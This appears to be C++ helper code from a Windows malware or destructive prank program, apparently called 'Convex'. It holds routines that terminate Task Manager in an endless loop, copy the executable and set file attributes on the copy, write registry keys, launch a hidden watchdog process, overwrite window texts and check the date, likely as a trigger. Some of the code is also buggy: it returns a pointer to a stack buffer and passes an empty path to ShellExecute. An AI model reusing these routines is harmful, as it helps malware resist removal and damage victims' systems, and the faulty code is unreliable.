#include <tlhelp32.h>


INT WINAPI EndHandle(HANDLE hHandle, HANDLE hHeap) {
	TerminateThread(hHandle, 0);
	CloseHandle(hHandle);
	HeapDestroy(hHeap);
}

INT WINAPI Redraw(VOID) {
	RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
}

LPCWSTR GetDirW(VOID) {
	WCHAR wBuffer[MAX_PATH] = {};
	GetModuleFileNameW(NULL, (WCHAR*)wBuffer, MAX_PATH);
	return (CONST WCHAR*)wBuffer;
}

typedef enum _DATECHECK_DATE_TYPES {
	DATE_YEAR = 0,
	DATE_MONTH,
	DATE_DAY_WEEK,
	DATE_DAY
} DATECHECK_DATE_TYPES, *PDATECHECK_DATE_TYPES;

namespace Call {
	WORD DateCheck(DATECHECK_DATE_TYPES dcdt) {
		SYSTEMTIME lpSystemTime;
		GetSystemTime(&lpSystemTime);
		switch (dcdt) {
			case DATE_YEAR:
				return lpSystemTime.wYear;
				break;
			case DATE_MONTH:
				return lpSystemTime.wMonth;
				break;
			case DATE_DAY_WEEK:
				return lpSystemTime.wDayOfWeek;
				break;
			case DATE_DAY:
				return lpSystemTime.wDay;
				break;
		}
	}
	
	LPARAM WINAPI EnumProc(HWND hwnd, LPCTSTR lpctText) {
		SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)lpctText);
	}
	
	INT WINAPI ExtCopyFile(LPCWSTR lpcwOriginal, LPCWSTR lpcwNew, DWORD dwFileAttributes) {
		CopyFileW(lpcwOriginal, lpcwNew, TRUE);
		SetFileAttributesW(lpcwNew, dwFileAttributes);
	}
	
	LRESULT WINAPI TextProc(HWND hwnd, LPARAM longParam) {
		EnumProc(hwnd, "Convex");
		return 0x01;
	}
	
	DWORD WINAPI RegistryW(HKEY hKey, LPCWSTR lpcwRegPath, LPCWSTR lpcwRegValueName, DWORD dwRegType, BYTE bData, LPCWSTR lpcwStringData, BOOL ToggleString) {
		HKEY phResult;
		RegCreateKeyW(hKey, lpcwRegPath, &phResult);
		switch (ToggleString) {
			case FALSE: {
				RegSetValueExW(phResult, lpcwRegValueName, 0, dwRegType, &bData, sizeof(bData));
				break;
			}
			case TRUE: {
				RegSetValueExW(phResult, lpcwRegValueName, 0, dwRegType, (LPBYTE)lpcwStringData, sizeof(lpcwStringData) * 16);
				break;
			}
		}
		RegCloseKey(phResult);
	}
	
	VOID ExecuteWatchdog(VOID) {
		ShellExecuteW(NULL, L"open", (LPCWSTR)((LPWSTR)LocalAlloc(LPTR, 32768)), L"/watchdog", NULL, SW_HIDE);
	}
	
	VOID SnapExeFile(VOID) {
		while (TRUE) {
			Sleep(500);
			PROCESSENTRY32W proc32;
			HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			memset(&proc32, 0, sizeof(proc32));
			proc32.dwSize = sizeof(PROCESSENTRY32W);
			if (Process32FirstW(hSnapshot, &proc32)) {
				while (Process32NextW(hSnapshot, &proc32)) {
					if (lstrcmpW(proc32.szExeFile, L"taskmgr.exe") == 0) TerminateProcess(OpenProcess(PROCESS_TERMINATE, FALSE, proc32.th32ProcessID), 0);
				}
			} 
			CloseHandle(hSnapshot);
		}
	}
	
	INT IfWindowsXP(VOID) {
		OSVERSIONINFOW lpVersionInfo;
		memset(&lpVersionInfo, 0, sizeof(lpVersionInfo));
		lpVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
		GetVersionExW(&lpVersionInfo);
		if (lpVersionInfo.dwMajorVersion == 5) return TRUE;
		else return FALSE;
	}
}
